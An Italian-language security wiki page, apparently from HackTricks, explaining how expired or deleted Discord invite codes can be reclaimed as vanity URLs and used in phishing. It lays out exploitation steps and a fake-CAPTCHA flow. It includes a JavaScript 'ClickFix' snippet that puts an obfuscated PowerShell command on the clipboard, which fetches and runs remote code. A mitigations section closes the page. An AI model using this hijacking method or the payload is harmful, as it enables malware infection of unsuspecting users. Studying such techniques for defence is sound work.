# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

La vulnerabilità del sistema di inviti di Discord consente agli attori delle minacce di rivendicare codici di invito scaduti o eliminati (temporanei, permanenti o personalizzati) come nuovi link vanity su qualsiasi server potenziato di Livello 3. Normalizzando tutti i codici in minuscolo, gli attaccanti possono preregistrare codici di invito noti e dirottare silenziosamente il traffico una volta che il link originale scade o il server sorgente perde il suo potenziamento.

## Tipi di Inviti e Rischio di Dirottamento

| Tipo di Invito        | Dirottabile? | Condizione / Commenti                                                                                       |
|-----------------------|--------------|------------------------------------------------------------------------------------------------------------|
| Link di Invito Temporaneo | ✅          | Dopo la scadenza, il codice diventa disponibile e può essere nuovamente registrato come URL vanity da un server potenziato. |
| Link di Invito Permanente | ⚠️          | Se eliminato e composto solo da lettere minuscole e cifre, il codice potrebbe diventare nuovamente disponibile.        |
| Link Vanity Personalizzato | ✅          | Se il server originale perde il suo Potenziamento di Livello 3, il suo invito vanity diventa disponibile per una nuova registrazione.    |

## Passi di Sfruttamento

1. Ricognizione
- Monitorare fonti pubbliche (forum, social media, canali Telegram) per link di invito che corrispondono al modello `discord.gg/{code}` o `discord.com/invite/{code}`.
- Raccogliere codici di invito di interesse (temporanei o vanity).
2. Preregistrazione
- Creare o utilizzare un server Discord esistente con privilegi di Potenziamento di Livello 3.
- In **Impostazioni Server → URL Vanity**, tentare di assegnare il codice di invito target. Se accettato, il codice è riservato dal server malevolo.
3. Attivazione del Dirottamento
- Per inviti temporanei, attendere che l'invito originale scada (o eliminarlo manualmente se controlli la sorgente).
- Per codici contenenti lettere maiuscole, la variante minuscola può essere rivendicata immediatamente, anche se il reindirizzamento si attiva solo dopo la scadenza.
4. Reindirizzamento Silenzioso
- Gli utenti che visitano il vecchio link vengono inviati senza soluzione di continuità al server controllato dall'attaccante una volta che il dirottamento è attivo.

## Flusso di Phishing tramite Server Discord

1. Limitare i canali del server in modo che sia visibile solo un canale **#verify**.
2. Distribuire un bot (ad es., **Safeguard#0786**) per invitare i nuovi arrivati a verificarsi tramite OAuth2.
3. Il bot reindirizza gli utenti a un sito di phishing (ad es., `captchaguard.me`) sotto le spoglie di un passaggio CAPTCHA o di verifica.
4. Implementare il trucco UX **ClickFix**:
- Visualizzare un messaggio CAPTCHA rotto.
- Guidare gli utenti ad aprire la finestra di dialogo **Win+R**, incollare un comando PowerShell precaricato e premere Invio.

### Esempio di Iniezione Clipboard ClickFix
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Questo approccio evita download diretti di file e sfrutta elementi UI familiari per ridurre il sospetto degli utenti.

## Mitigazioni

- Utilizzare link di invito permanenti contenenti almeno una lettera maiuscola o un carattere non alfanumerico (mai scadere, non riutilizzabili).
- Ruotare regolarmente i codici di invito e revocare i link vecchi.
- Monitorare lo stato del potenziamento del server Discord e le rivendicazioni degli URL vanity.
- Educare gli utenti a verificare l'autenticità del server e a evitare di eseguire comandi incollati dagli appunti.

## Riferimenti

- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – [https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- Discord Custom Invite Link Documentation – [https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
